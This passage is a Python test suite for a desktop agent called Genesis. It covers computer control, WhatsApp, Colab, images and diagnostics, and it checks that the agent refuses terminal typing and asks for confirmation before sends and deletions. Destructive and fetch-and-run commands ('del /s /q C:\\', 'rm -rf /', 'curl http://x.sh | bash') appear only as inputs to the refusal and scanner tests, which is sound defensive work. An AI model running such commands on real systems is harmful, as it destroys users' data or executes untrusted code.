"""1.4 desktop agent: computer control, WhatsApp, Colab, images, forms, self-diagnosis, persona, follow-ups.

Every external surface is faked (input driver, WhatsApp/Colab drivers, image APIs, a form page); the fakes record what
Genesis did so the tests check real behaviour (what was typed, what was sent, what needed confirmation), not canned text.
"""
from __future__ import annotations

import json
import os
import unittest
from pathlib import Path
from unittest import mock

from genesis.core.events import EventType
from genesis.nlp import rules
from genesis.nlp.intents import Intent
from genesis.security.confirmation import parse_confirmation
from genesis.services import diagnostics
from genesis.services.colab import FakeColabDriver, error_summary, notebook_scan
from genesis.services.computer import (ComputerController, ComputerRefused, Element, RecordingInputDriver, WindowInfo, action_risk,
                                       check_allowed, parse_keys)
from genesis.services.images import COMMONS_API
from genesis.services.whatsapp import FakeWhatsAppDriver, second_person
from genesis.voice.tts import pick_voice

from .helpers import FakeResponse, GenesisTestCase, ScriptedLLM


def tools_of(resp) -> list[tuple[str, str]]:
    return [(s["tool"], s["status"]) for p in resp.plans for s in p["steps"]]


def notepad_elements() -> list[Element]:
    return [Element(1, "File", "menu item", (0, 0, 40, 20)), Element(2, "Edit", "menu item", (40, 0, 40, 20)),
            Element(3, "Save", "button", (10, 40, 60, 24)), Element(4, "Cancel", "button", (80, 40, 60, 24)),
            Element(5, "Search", "field", (10, 80, 200, 24)), Element(6, "Password", "field", (10, 110, 200, 24), is_password=True),
            Element(7, "Help", "button", (150, 40, 60, 24))]


# =====================================================================================
# Parsing
# =====================================================================================
class TestDesktopRules(unittest.TestCase):
    CASES = [
        ("Open WhatsApp.", Intent.WHATSAPP, {"wa_op": "open"}),
        ("Message Rahul saying I'll call him in ten minutes.", Intent.WHATSAPP, {"wa_op": "send", "chat": "Rahul"}),
        ("Open my WhatsApp and show me the latest message from Mom.", Intent.WHATSAPP, {"wa_op": "read", "chat": "Mom", "count": 1}),
        ("text Mom that I'll be there at 7", Intent.WHATSAPP, {"wa_op": "send", "chat": "Mom", "text": "I'll be there at 7"}),
        ("Draft a message to Rahul.", Intent.WHATSAPP, {"wa_op": "draft", "chat": "Rahul", "text": None}),
        ("Open Google Colab.", Intent.COLAB, {"colab_op": "open"}),
        ("Create a notebook.", Intent.COLAB, {"colab_op": "new"}),
        # how speech-to-text actually spells it
        ("open google collab", Intent.COLAB, {"colab_op": "open"}),
        ("Open Google Co lab.", Intent.COLAB, {"colab_op": "open"}),
        ("open google kolab", Intent.COLAB, {"colab_op": "open"}),
        ("open collab", Intent.COLAB, {"colab_op": "open"}),
        ("open google collaboratory", Intent.COLAB, {"colab_op": "open"}),
        ("create a new collab notebook", Intent.COLAB, {"colab_op": "new"}),
        ("write code in collab to print hello and run it", Intent.COLAB, {"colab_op": "write", "task": "print hello",
                                                                          "run_after": True}),
        ("Show me a picture of a peacock.", Intent.IMAGE, {"image_op": "search", "query": "peacock"}),
        ("Show me a cheetah.", Intent.IMAGE, {"image_op": "search", "query": "cheetah"}),
        ("Find an image of the Eiffel Tower.", Intent.IMAGE, {"image_op": "search", "query": "Eiffel Tower"}),
        ("Generate a futuristic image of a city.", Intent.IMAGE, {"image_op": "generate", "prompt": "futuristic city"}),
        ("what does a quokka look like", Intent.IMAGE, {"image_op": "search", "query": "quokka"}),
        ("press ctrl+s", Intent.COMPUTER, {"computer_op": "press", "keys": "ctrl+s"}),
        ("type hello world", Intent.COMPUTER, {"computer_op": "type", "text": "hello world"}),
        ("copy", Intent.COMPUTER, {"computer_op": "copy"}),
        ("paste it here", Intent.COMPUTER, {"computer_op": "paste"}),
        ("select all", Intent.COMPUTER, {"computer_op": "select_all"}),
        ("right click the recycle bin", Intent.COMPUTER, {"computer_op": "click", "button": "right"}),
        ("drag report.pdf to the Archive folder", Intent.COMPUTER, {"computer_op": "drag"}),
        ("Fill this application using my resume.", Intent.FORM, {"form_op": "fill", "source": "resume"}),
        ("is my internet working", Intent.INFORMATION_REQUEST, {"topic": "connection"}),
        ("why isn't youtube loading", Intent.INFORMATION_REQUEST, {"topic": "connection", "url": "https://www.youtube.com/"}),
    ]
    NOT = [("show me my unread emails", Intent.READ_EMAIL), ("draft an email to my professor saying hi", Intent.DRAFT_EMAIL),
           ("show me the latest email from AMD", Intent.READ_EMAIL), ("Open Gmail.", Intent.OPEN_APPLICATION),
           ("What am I looking at?", Intent.SCREEN)]
    UNTOUCHED = ["lets collab on this project", "collab with Rahul on the report"]

    def test_collab_in_ordinary_text_is_not_rewritten(self):
        for text in self.UNTOUCHED:
            self.assertEqual(rules.normalize(text), text)

    def test_new_intents(self):
        for text, intent, slots in self.CASES:
            hit = rules.parse(rules.normalize(text))
            self.assertIsNotNone(hit, text)
            self.assertEqual(hit.intent, intent, text)
            for k, v in slots.items():
                self.assertEqual(hit.slots.get(k), v, (text, k, hit.slots))

    def test_existing_intents_unchanged(self):
        for text, intent in self.NOT:
            self.assertEqual(rules.parse(rules.normalize(text)).intent, intent, text)
        for text in ("show me an example", "show me how to do it", "type script is great"):
            hit = rules.parse(rules.normalize(text))
            self.assertTrue(hit is None or hit.intent != Intent.IMAGE, text)

    def test_second_person(self):
        self.assertEqual(second_person("I'll call him in ten minutes"), "I'll call you in ten minutes.")
        self.assertEqual(second_person("tell her car is ready"), "Tell your car is ready.")
        self.assertEqual(second_person("I'll pick her up later"), "I'll pick you up later.")
        self.assertEqual(second_person("he should bring his laptop"), "You should bring your laptop.")

    def test_dont_send_is_a_no(self):
        for t in ("don't send it", "Don't submit it yet.", "not yet", "no, don't send it"):
            self.assertFalse(parse_confirmation(t), t)
        for t in ("send it", "okay, submit it", "yes, send it"):
            self.assertTrue(parse_confirmation(t), t)


# =====================================================================================
# Computer control: safety + controller
# =====================================================================================
class TestComputerSafety(unittest.TestCase):
    def test_keys_and_risk(self):
        self.assertEqual(parse_keys("Ctrl + Shift + S"), ["ctrl", "shift", "s"])
        self.assertEqual(parse_keys("control+return"), ["ctrl", "enter"])
        chat = WindowInfo("WhatsApp", "WhatsApp.exe")
        self.assertEqual(action_risk("press", window=chat, keys=["enter"]), "high")
        self.assertEqual(action_risk("press", window=WindowInfo("Notepad", "notepad.exe"), keys=["enter"]), "low")
        self.assertEqual(action_risk("click", target_name="Send"), "high")
        self.assertEqual(action_risk("click", target_name="Place order"), "high")
        self.assertEqual(action_risk("click", target_name="Next"), "low")
        self.assertEqual(action_risk("click", coordinates=True), "medium")
        self.assertEqual(action_risk("press", keys=["shift", "delete"]), "high")

    def test_refusals(self):
        term = WindowInfo("Administrator: Windows PowerShell", "powershell.exe", "ConsoleWindowClass")
        with self.assertRaises(ComputerRefused):
            check_allowed("type", term)
        with self.assertRaises(ComputerRefused):
            check_allowed("press", WindowInfo("Run", "explorer.exe"), keys=["enter"])
        with self.assertRaises(ComputerRefused):
            check_allowed("press", WindowInfo("Notepad", "notepad.exe"), keys=["win", "r"])
        with self.assertRaises(ComputerRefused):
            check_allowed("type", WindowInfo("Login", "chrome.exe"), element=Element(1, "Password", "field", is_password=True))

    def test_find_click_type(self):
        d = RecordingInputDriver(elements=notepad_elements())
        c = ComputerController(d)
        self.assertEqual(c.find("the second button").name, "Cancel")
        self.assertEqual(c.find("save").name, "Save")
        self.assertEqual(c.find("search box").name, "Search")
        self.assertEqual(c.find("last button").name, "Help")
        with self.assertRaises(ComputerRefused):
            c.find("the ninth button")
        info = c.click(c.find("Save"))
        self.assertEqual(info["method"], "accessibility")  # accessibility first, no mouse
        d.invokable = False
        info = c.click(c.find("Cancel"))
        self.assertEqual(info["method"], "element-position")  # then the element's own position
        self.assertIn(("click", 110, 52, "left", 1), d.actions)
        c.type("hello", c.find("search"), replace=True)
        self.assertIn(("set_value", "Search", "hello"), d.actions)
        with self.assertRaises(ComputerRefused):
            c.type("hunter2", c.find("password", role="field"))

    def test_sendinput_struct_layout(self):
        import ctypes

        from genesis.services import computer as C

        class _Fn:
            argtypes = restype = None

        class _DLL:
            def __getattr__(self, n):
                f = _Fn()
                setattr(self, n, f)
                return f

        with mock.patch.object(ctypes, "WinDLL", create=True, new=lambda *a, **k: _DLL()):
            d = C.WindowsInputDriver.__new__(C.WindowsInputDriver)
            d._setup()
            self.assertEqual(ctypes.sizeof(d._INPUT), 40 if ctypes.sizeof(ctypes.c_void_p) == 8 else 28)  # Win32 INPUT size
            self.assertEqual(d._vk("f5"), 0x74)
            self.assertEqual(d._mouse_input(0x0800, -120).mi.mouseData, 0xFFFFFF88)

    def test_newline_never_sends_in_chat_apps(self):
        d = RecordingInputDriver(WindowInfo("WhatsApp", "WhatsApp.exe"))
        ComputerController(d).type("line one\nline two")
        self.assertEqual(d.actions[-1], ("type", "line one\nline two", ("shift", "enter")))


class ComputerCase(GenesisTestCase):
    window = WindowInfo("notes.txt - Notepad", "notepad.exe", "Notepad")

    def computer_driver(self):
        self.drv = RecordingInputDriver(self.window, notepad_elements())
        return self.drv


class TestComputerTools(ComputerCase):
    def test_type_press_copy_paste(self):
        r = self.say("type hello world")
        self.assertEqual(tools_of(r), [("computer_type", "succeeded")])
        self.assertIn(("type", "hello world", ("enter",)), self.drv.actions)
        r = self.say("press ctrl+s")
        self.assertEqual(tools_of(r), [("computer_press", "succeeded")])
        self.assertIn(("keys", ("ctrl", "s")), self.drv.actions)
        self.drv.selection = "copied words"
        r = self.say("copy")
        self.assertIn("Copied 12 characters", r.text)
        r = self.say("paste")
        self.assertIn(("keys", ("ctrl", "v")), self.drv.actions)
        r = self.say("select all")
        self.assertIn(("keys", ("ctrl", "a")), self.drv.actions)

    def test_click_by_name_and_ordinal_via_accessibility(self):
        r = self.say("click Save")
        self.assertEqual(tools_of(r), [("computer_click", "succeeded")])  # a harmless named button needs no confirmation
        self.assertIn(("invoke", "Save"), self.drv.actions)
        r = self.say("what buttons are here")
        self.assertEqual(tools_of(r)[0][0], "computer_observe")
        self.assertIn("Cancel (button)", r.text)
        r = self.say("click the second button")
        self.assertIn(("invoke", "Cancel"), self.drv.actions)

    def test_sensitive_click_needs_confirmation(self):
        self.drv._elements.append(Element(8, "Send", "button", (0, 200, 60, 24)))
        r = self.say("click Send")
        self.assertEqual(r.status, "awaiting_confirmation")
        self.assertNotIn(("invoke", "Send"), self.drv.actions)
        self.say("yes")
        self.assertIn(("invoke", "Send"), self.drv.actions)

    def test_refuses_dangerous_shortcuts(self):
        r = self.say("press win+r")
        self.assertIn("don't use the win+r shortcut", r.text)
        self.assertFalse(any(a[0] == "keys" for a in self.drv.actions))


class TestMoreComputerSafety(unittest.TestCase):
    def test_enter_and_newlines(self):
        self.assertEqual(action_risk("press", window=WindowInfo("Apply - Google Chrome", "chrome.exe"), keys=["enter"]), "medium")
        self.assertEqual(action_risk("press", window=WindowInfo("Inbox - Outlook", "olk.exe"), keys=["ctrl", "enter"]), "high")
        d = RecordingInputDriver(WindowInfo("Form - Google Chrome", "chrome.exe"))
        with self.assertRaises(ComputerRefused):
            ComputerController(d).type("line one\nline two")
        d2 = RecordingInputDriver(WindowInfo("a.txt - Notepad", "notepad.exe"))
        ComputerController(d2).type("line one\nline two")
        self.assertEqual(d2.actions[-1][0], "type")

    def test_explorer_and_start_menu(self):
        exp = WindowInfo("Downloads - File Explorer", "explorer.exe", "CabinetWClass")
        with self.assertRaises(ComputerRefused):
            check_allowed("type", exp, element=Element(1, "Address", "field"))
        with self.assertRaises(ComputerRefused):
            check_allowed("press", exp, keys=["alt", "d"])
        with self.assertRaises(ComputerRefused):
            check_allowed("press", WindowInfo("Notepad", "notepad.exe"), keys=["win"])
        with self.assertRaises(ComputerRefused):
            check_allowed("type", WindowInfo("Search", "SearchHost.exe"))
        check_allowed("type", exp, element=Element(2, "Name", "field"))  # renaming a file is fine

    def test_never_acts_on_genesis_itself(self):
        from genesis.services.platform import RecordingBackend

        backend = RecordingBackend()
        d = RecordingInputDriver(WindowInfo("Genesis", "python.exe", pid=os.getpid()))
        ComputerController(d, backend=backend).press(["ctrl", "s"])
        self.assertIn(("window", 101, "focus"), backend.actions)  # switched to the app that was in use first


class TestFormFollowUpScope(GenesisTestCase):
    def test_other_commands_are_not_form_edits(self):
        from genesis.nlp import followups

        st = self.core.dialogue.state(self.core.ensure_conversation())
        st.push_focus("form", {"key": "form"}, "the form")
        self.assertIsNone(followups.resolve("set the volume to 50", st))
        st.push_focus("url", {"url": "https://x.example"}, "x")
        self.assertIsNone(followups.resolve("change the phone number to 123", st))


class TestTerminalProtection(ComputerCase):
    window = WindowInfo("Command Prompt", "cmd.exe", "ConsoleWindowClass")

    def test_never_types_into_terminals(self):
        r = self.say("type del /s /q C:\\")
        self.assertIn("don't type into terminals", r.text)
        self.assertFalse(any(a[0] == "type" for a in self.drv.actions))


class TestComputerTask(ComputerCase):
    def setUp(self):
        self.script = [{"action": "click", "id": 2}, {"action": "click", "id": 3}, {"action": "done", "message": "Saved it."}]

        def reply(messages, json_mode):
            last = messages[-1]["content"]
            if "operating a Windows computer" in last:
                return json.dumps(self.script.pop(0))
            return "{}" if json_mode else "OK"

        self.llm = ScriptedLLM(reply)
        super().setUp()

    def test_observe_act_loop(self):
        r = self.say("save the document in this app")
        self.assertEqual(tools_of(r), [("computer_task", "succeeded")])
        self.assertEqual([a for a in self.drv.actions if a[0] == "invoke"], [("invoke", "Edit"), ("invoke", "Save")])
        self.assertIn("Saved it.", r.text)

    def test_sensitive_step_is_handed_back_for_confirmation(self):
        self.drv._elements.append(Element(8, "Delete", "button", (0, 200, 60, 24)))
        self.script[:] = [{"action": "click", "id": 8}]
        r = self.say("clear everything in this app")
        self.assertEqual(r.status, "awaiting_confirmation")
        self.assertNotIn(("invoke", "Delete"), self.drv.actions)
        self.assertIn("Delete", r.text)
        r = self.say("no")
        self.assertNotIn(("invoke", "Delete"), self.drv.actions)


# =====================================================================================
# Self-diagnosis
# =====================================================================================
class TestDiagnostics(unittest.TestCase):
    def test_url_causes(self):
        with mock.patch.object(diagnostics, "_resolve", return_value=False), mock.patch.object(diagnostics, "_connect", return_value=False):
            self.assertEqual(diagnostics.diagnose_url("https://example.com")["cause"], "offline")
        with mock.patch.object(diagnostics, "_resolve", side_effect=lambda h: h != "nosuch.example"), \
                mock.patch.object(diagnostics, "_connect", return_value=True):
            self.assertEqual(diagnostics.diagnose_url("https://nosuch.example")["cause"], "dns_failed")
        with mock.patch.object(diagnostics, "_resolve", return_value=True), \
                mock.patch.object(diagnostics, "_connect", side_effect=lambda h, p, timeout=3.0: h != "down.example"):
            self.assertEqual(diagnostics.diagnose_url("https://down.example")["cause"], "site_down")

        class S:
            def __init__(self, status):
                self.status = status

            def get(self, *a, **k):
                return FakeResponse(self.status, {})

        with mock.patch.object(diagnostics, "_resolve", return_value=True), mock.patch.object(diagnostics, "_connect", return_value=True):
            self.assertEqual(diagnostics.diagnose_url("https://x.example", session=S(503))["cause"], "site_down")
            self.assertEqual(diagnostics.diagnose_url("https://x.example/a", session=S(404))["cause"], "http_error")
            self.assertEqual(diagnostics.diagnose_url("https://x.example", session=S(200))["cause"], "site_ok")

    def test_app_causes(self):
        self.assertEqual(diagnostics.diagnose_app("Photoshop", errors=["[WinError 5] Access is denied"], target="C:/x.exe")["cause"],
                         "permission_denied")
        self.assertEqual(diagnostics.diagnose_app("Zoom", errors=[], target="C:/definitely/missing/Zoom.exe")["cause"],
                         "missing_executable")
        with mock.patch("pathlib.Path.exists", return_value=True):
            self.assertEqual(diagnostics.diagnose_app("Zoom", errors=["Zoom.exe exited immediately"], target="C:/Zoom.exe")["cause"],
                             "crashed_on_start")


class TestDiagnosisInConversation(GenesisTestCase):
    def test_failed_launch_is_explained(self):
        self.backend.fail_launch = True
        self.backend.existing = []
        r = self.say("open notepad")
        self.assertIn("Let me figure out why", r.text)
        self.assertIn("program file is missing", r.text)
        self.assertNotIn("Traceback", r.text)

    def test_connection_check(self):
        with mock.patch.object(diagnostics, "_connect", return_value=False), mock.patch.object(diagnostics, "_resolve", return_value=False):
            r = self.say("is my internet working?")
        self.assertIn("isn't connected to the internet", r.text)


# =====================================================================================
# WhatsApp
# =====================================================================================
def wa_chats():
    return {"Rahul": [{"incoming": True, "text": "Call me when free", "time": "10:02", "sender": "Rahul"}],
            "Mom": [{"incoming": True, "text": "Did you eat?", "time": "18:40", "sender": "Mom"},
                    {"incoming": False, "text": "Yes!", "time": "18:41", "sender": "You"},
                    {"incoming": True, "text": "Come home by 7 tonight", "time": "18:45", "sender": "Mom"}],
            "Priya Sharma": [], "Priya K": []}


class WhatsAppCase(GenesisTestCase):
    def setUp(self):
        self.wa = FakeWhatsAppDriver(wa_chats())
        self.whatsapp_drivers = [self.wa]
        super().setUp()


class TestWhatsApp(WhatsAppCase):
    def test_open(self):
        r = self.say("Open WhatsApp.")
        self.assertEqual(tools_of(r), [("whatsapp_open", "succeeded")])
        self.assertTrue(r.text.startswith("Done, Boss"))

    def test_message_is_drafted_then_sent_only_after_confirmation(self):
        r = self.say("Message Rahul saying I'll call him in ten minutes.")
        self.assertEqual(r.status, "awaiting_confirmation")
        self.assertIn("I've drafted the message to Rahul: “I'll call you in ten minutes.” Send it?", r.text)
        self.assertEqual(self.wa.composer, "I'll call you in ten minutes.")  # composed…
        self.assertEqual(self.wa.sent, [])  # …but not sent
        r = self.say("yes")
        self.assertEqual(self.wa.sent, [("Rahul", "I'll call you in ten minutes.")])
        self.assertIn("Sent to Rahul", r.text)
        step = [s for p in r.plans for s in p["steps"] if s["tool"] == "whatsapp_send"][0]
        self.assertTrue(step["verified"])  # verified: the message shows up as outgoing in the chat

    def test_dont_send_then_send_it(self):
        self.say("text Mom that I'll be there at 7")
        r = self.say("don't send it")
        self.assertIn("won't", r.text)
        self.assertEqual(self.wa.sent, [])
        r = self.say("okay, send it")
        self.assertEqual(self.wa.sent, [("Mom", "I'll be there at 7.")])

    def test_read_latest_then_reply_to_that(self):
        r = self.say("Open my WhatsApp and show me the latest message from Mom.")
        self.assertIn("Come home by 7 tonight", r.text)
        self.assertNotIn("Yes!", r.text)
        r = self.say("Reply to that message saying I'll be there at 7.")
        self.assertEqual(r.status, "awaiting_confirmation")
        self.assertIn("to Mom", r.text)
        self.say("yes")
        self.assertEqual(self.wa.sent, [("Mom", "I'll be there at 7.")])

    def test_draft_asks_for_text_and_never_sends(self):
        r = self.say("Draft a message to Rahul.")
        self.assertEqual(r.status, "awaiting_input")
        self.assertIn("What should the message to Rahul say?", r.text)
        r = self.say("tell him I'm running late")
        self.assertEqual(tools_of(r), [("whatsapp_draft", "succeeded")])
        self.assertEqual(self.wa.composer, "I'm running late.")
        self.assertEqual(self.wa.sent, [])
        r = self.say("send it")  # explicit, after seeing the exact draft
        self.assertEqual(self.wa.sent, [("Rahul", "I'm running late.")])

    def test_ambiguous_and_unknown_chat(self):
        r = self.say("message Priya saying hi")
        self.assertIn("several chats matching", r.text)
        r = self.say("message Zed saying hi")
        self.assertIn("couldn't find a chat", r.text)
        self.assertEqual(self.wa.sent, [])

    def test_login_is_never_bypassed(self):
        self.wa.logged_in = False
        r = self.say("show me the latest WhatsApp message from Mom")
        self.assertIn("scan the QR code", r.text)


class TestWhatsAppWithoutAutomation(GenesisTestCase):
    def test_explains_and_still_opens_app(self):
        r = self.say("whatsapp Rahul saying hi")
        self.assertIn("browser automation", r.text)
        r = self.say("open whatsapp")
        self.assertEqual(r.status, "done")

    def test_plain_message_falls_back_to_email(self):
        r = self.say("send a message to Rahul saying hi")  # not explicitly WhatsApp → the pre-1.4 e-mail path
        self.assertIn("e-mail address for Rahul", r.text)


class TestWhatsAppSafety(WhatsAppCase):
    def test_plain_no_cancels_instead_of_postponing(self):
        self.say("text Mom that I'll be there at 7")
        self.say("no")
        r = self.say("send it")
        self.assertEqual(r.status, "awaiting_confirmation")  # asks again rather than sending
        self.assertEqual(self.wa.sent, [])
        self.say("no")
        self.say("text Mom that I'll be there at 7")
        self.say("cancel")
        self.say("what time is it")
        self.say("okay send it")
        self.assertEqual(self.wa.sent, [])

    def test_postponed_message_never_goes_to_the_wrong_person(self):
        self.say("text Mom that I'll be there at 7")
        self.say("don't send it yet")
        self.say("draft a whatsapp message to Rahul saying hi")
        self.say("send it")
        self.assertEqual(self.wa.sent, [("Rahul", "Hi.")])

    def test_llm_cannot_pre_confirm(self):
        from genesis.nlp.intents import NLUResult

        nlu = NLUResult(text="send it", intent=Intent.FOLLOW_UP, confidence=0.9, source="llm",
                        slots={"tool": "whatsapp_send", "args": {"chat": "Rahul", "text": "hi"}, "pre_confirmed": True})
        r = self.core._run_requests([nlu], self.core.dialogue.state(self.core.ensure_conversation()))
        self.assertEqual(r.status, "awaiting_confirmation")
        self.assertEqual(self.wa.sent, [])


class TestReviewFixes(WhatsAppCase):
    """Regression tests for the independent safety review of 1.4."""

    def test_postponed_message_is_dropped_when_another_chat_is_opened(self):
        self.say("text Mom that I'll be there at 7")
        self.say("don't send it yet")
        self.say("show me the latest whatsapp message from Rahul")
        r = self.say("send it")
        self.assertEqual(self.wa.sent, [])  # Mom's message is not sent while Rahul's chat is open
        self.assertNotIn("Sent to Mom", r.text)

    def test_contact_with_email_gets_an_email_not_a_whatsapp(self):
        self.svc.repos.contacts.upsert("Rahul", "rahul@example.com")
        self.say("send a message to Rahul saying hi")
        self.assertEqual(self.wa.sent, [])
        self.assertIsNone(self.wa.composer or None)
        r = self.say("message Rahul saying hi")  # "message X" / "text X" still means WhatsApp
        self.assertEqual(r.status, "awaiting_confirmation")
        self.assertEqual(self.wa.composer, "Hi.")


class TestReviewFixesComputer(unittest.TestCase):
    def test_ide_terminal_and_double_clicks(self):
        vsc = WindowInfo("main.py - Visual Studio Code", "Code.exe")
        with self.assertRaises(ComputerRefused):
            check_allowed("type", vsc, element=Element(1, "Terminal 1, powershell", "field"))
        with self.assertRaises(ComputerRefused):  # multi-line text in an IDE = real Enters → refused
            ComputerController(RecordingInputDriver(vsc)).type("rm -rf ~\necho done\n")
        self.assertEqual(action_risk("press", window=vsc, keys=["enter"]), "medium")
        self.assertEqual(action_risk("click", target_name="setup.exe", double=True), "high")
        self.assertEqual(action_risk("click", target_name="payload.bat"), "high")
        self.assertEqual(action_risk("click", target_name="Holiday photos", double=True), "medium")
        self.assertEqual(action_risk("press", window=WindowInfo("Report - Word", "winword.exe"), keys=["alt", "s"]), "high")

    def test_explorer_blind_typing_refused(self):
        with self.assertRaises(ComputerRefused):
            check_allowed("type", WindowInfo("Downloads - File Explorer", "explorer.exe"), element=None)

    def test_routing(self):
        for q, intent in [("show me a picture of my cat", Intent.FILE_OPERATION), ("find pictures of my kids", Intent.FILE_OPERATION),
                          ("what does my calendar look like", Intent.CALENDAR),
                          ("generate pictures of cats", Intent.IMAGE), ("show me a picture of a peacock", Intent.IMAGE)]:
            hit = rules.parse(rules.normalize(q), None)
            self.assertEqual(hit.intent if hit else None, intent, q)
        self.assertEqual(rules.parse(rules.normalize("generate pictures of cats"), None).slots["prompt"], "cats")

    def test_colab_ai_code_that_deletes_or_execs_counts_as_reaching_out(self):
        from genesis.services.colab import reaches_out

        for code in ('from pathlib import Path\nfor p in Path("/content").rglob("*"): p.unlink()',
                     '__import__("shutil").rmtree("/x")', 'exec(open("a.py").read())', 'open("x.csv", "w").write("")'):
            self.assertTrue(reaches_out(code), code)
        self.assertFalse(reaches_out("import pandas as pd\ndf = pd.read_csv('data.csv')\nprint(df.head())"))


class TestClickWindowBinding(ComputerCase):
    def test_confirmed_click_is_not_replayed_in_another_window(self):
        self.drv._elements.append(Element(8, "Send", "button", (0, 200, 60, 24)))
        r = self.say("click Send")
        self.assertEqual(r.status, "awaiting_confirmation")
        self.drv.window = WindowInfo("Inbox - Outlook", "olk.exe", handle=999)  # the user switched windows meanwhile
        r = self.say("yes")
        self.assertNotIn(("invoke", "Send"), self.drv.actions)
        self.assertIn("window changed", r.text)


# =====================================================================================
# Google Colab
# =====================================================================================
def colab_llm():
    def reply(messages, json_mode):
        last = messages[-1]["content"]
        if "Google Colab notebook cell" in last:
            return json.dumps({"code": "import pandas as pd\ndf = pd.read_csv('data.csv')\nprint(df.shape[0] / 0)",
                               "summary": "loads the CSV"})
        if "This Google Colab cell failed" in last:
            return json.dumps({"code": "import pandas as pd\ndf = pd.read_csv('data.csv')\nprint(df.shape)",
                               "explanation": "Removed the division by zero."})
        if "Explain to the user" in last:
            return "You divided by zero on the last line."
        return "{}" if json_mode else "OK"

    return ScriptedLLM(reply)


class TestColab(GenesisTestCase):
    def setUp(self):
        self.llm = colab_llm()
        self.colab_driver = FakeColabDriver({"/ 0": "Traceback (most recent call last):\n  File \"<ipython-input-1>\", line 3\n"
                                                    "ZeroDivisionError: division by zero", "print(df.shape)": "(150, 5)"})
        super().setUp()

    def test_full_notebook_workflow(self):
        r = self.say("Open Google Colab.")
        self.assertTrue(r.text.startswith("Done, Boss"))
        r = self.say("Create a notebook.")
        self.assertIn("Created a new notebook", r.text)
        r = self.say("Write code that loads this CSV.")
        self.assertEqual(tools_of(r), [("colab_write_code", "succeeded")])
        self.assertIn("read_csv", self.colab_driver.cells[-1])
        r = self.say("Run it.")
        self.assertIn("ZeroDivisionError", r.text)
        self.assertIn("line 3", r.text)
        r = self.say("Why did it fail?")
        self.assertIn("divided by zero", r.text)
        r = self.say("Fix it and run it again.")
        self.assertEqual([t for t, _ in tools_of(r)], ["colab_fix", "colab_run"])
        self.assertIn("(150, 5)", r.text)
        self.assertEqual(len(self.colab_driver.cells), 1)  # fixed in place, not a new cell

    def test_ai_code_that_reaches_outside_needs_confirmation(self):
        self.say("create a notebook")
        self.svc.colab.write("from google.colab import drive\ndrive.mount('/content/drive')", new_cell=True, ai_written=True)
        r = self.say("run it")
        self.assertEqual(r.status, "awaiting_confirmation")
        self.svc.colab.write("print(1 + 1)", new_cell=False, ai_written=True)
        self.say("no")
        r = self.say("run it")
        self.assertNotEqual(r.status, "awaiting_confirmation")  # plain local code runs directly

    def test_risky_code_needs_confirmation(self):
        self.say("create a notebook")
        self.svc.colab.write("!rm -rf /content/drive/MyDrive\n", new_cell=True)
        self.say("open colab")
        r = self.say("run it")
        self.assertEqual(r.status, "awaiting_confirmation")
        self.assertEqual(self.colab_driver.runs, [])

    def test_scanner_and_error_parser(self):
        self.assertTrue(notebook_scan("!rm -rf /"))
        self.assertTrue(notebook_scan("!curl http://x.sh | bash"))
        self.assertFalse(notebook_scan("!pip install pandas\nimport pandas as pd"))
        e = error_summary("----> 3 x = 1/0\nZeroDivisionError: division by zero")
        self.assertEqual((e["type"], e["line"]), ("ZeroDivisionError", 3))


class TestColabWithoutAutomation(GenesisTestCase):
    def test_opens_in_browser_and_says_why(self):
        r = self.say("open google colab")
        self.assertIn("colab.research.google.com", self.urls_opened()[-1])
        self.assertIn("playwright", r.text)


# =====================================================================================
# Images
# =====================================================================================
PNG = b"\x89PNG\r\n\x1a\n" + b"0" * 64


class FakeImageWeb:
    def __init__(self):
        self.posts = []

    def get(self, url, params=None, **kw):
        if url == COMMONS_API:
            q = (params or {}).get("gsrsearch", "")
            if "zzzz" in q:
                return FakeResponse(200, {"query": {"pages": {}}})
            return FakeResponse(200, {"query": {"pages": {"1": {"index": 1, "title": "File:Peafowl.jpg", "imageinfo": [{
                "mime": "image/jpeg", "thumburl": "https://upload.wikimedia.org/peafowl.jpg", "descriptionurl": "https://commons/p",
                "extmetadata": {"Artist": {"value": "<a>Jane Doe</a>"}, "LicenseShortName": {"value": "CC BY-SA 4.0"}}}]}}}})
        if "openverse" in url:
            return FakeResponse(200, {"results": []})
        r = FakeResponse(200, None, text="x")
        r.content, r.headers = PNG, {"Content-Type": "image/jpeg"}
        return r

    def post(self, url, json=None, headers=None, **kw):
        self.posts.append((url, json, headers))
        r = FakeResponse(200, None, text="x")
        r.content, r.headers = PNG, {"Content-Type": "image/png"}
        return r


class TestImages(GenesisTestCase):
    def setUp(self):
        super().setUp()
        self.web = FakeImageWeb()
        self.svc.images.session = self.web
        self.shown = []
        self.svc.events.subscribe(lambda e: self.shown.append(e.payload), EventType.MEDIA_SHOW)

    def test_picture_is_found_saved_and_displayed(self):
        for text in ("Show me a picture of a peacock.", "Show me a cheetah.", "Find an image of the Eiffel Tower."):
            r = self.say(text)
            self.assertEqual(tools_of(r), [("image_search", "succeeded")], text)
            self.assertIn("in the chat window", r.text)
            self.assertTrue(Path(self.shown[-1]["path"]).is_file())  # a real file the UI displays
            self.assertIn("CC BY-SA", self.shown[-1]["credit"])
        step = r.plans[0]["steps"][0]
        self.assertTrue(step["verified"])

    def test_not_found_and_refusal(self):
        r = self.say("show me a picture of zzzz")
        self.assertIn("couldn't find a picture", r.text)
        self.assertEqual(self.shown, [])
        r = self.say("show me a picture of something nsfw")
        self.assertIn("can't", r.text)

    def test_generation_needs_a_model_then_works(self):
        r = self.say("Generate a futuristic image of a city.")
        self.assertIn("needs an image model", r.text)
        self.config.hf_token = "hf_" + "t" * 30
        r = self.say("Generate a futuristic image of a city.")
        self.assertEqual(tools_of(r), [("image_generate", "succeeded")])
        url, body, headers = self.web.posts[-1]
        self.assertIn("router.huggingface.co", url)
        self.assertEqual(body, {"inputs": "futuristic city"})
        self.assertTrue(Path(self.shown[-1]["path"]).is_file())
        self.assertNotIn(self.config.hf_token, r.text)


# =====================================================================================
# Forms
# =====================================================================================
class FakeFormPage:
    """Stands in for Genesis's browser showing a job application form."""

    def __init__(self):
        self.values: dict[int, str] = {}
        self.submitted = False
        self.fields = [
            {"id": 1, "label": "Full name", "type": "text", "name": "name", "required": True, "value": "", "options": []},
            {"id": 2, "label": "Email", "type": "email", "name": "email", "required": True, "value": "", "options": []},
            {"id": 3, "label": "Phone number", "type": "tel", "name": "phone", "required": False, "value": "", "options": []},
            {"id": 4, "label": "LinkedIn profile", "type": "url", "name": "li", "required": False, "value": "", "options": []},
            {"id": 5, "label": "Date of birth", "type": "date", "name": "dob", "required": False, "value": "", "options": []},
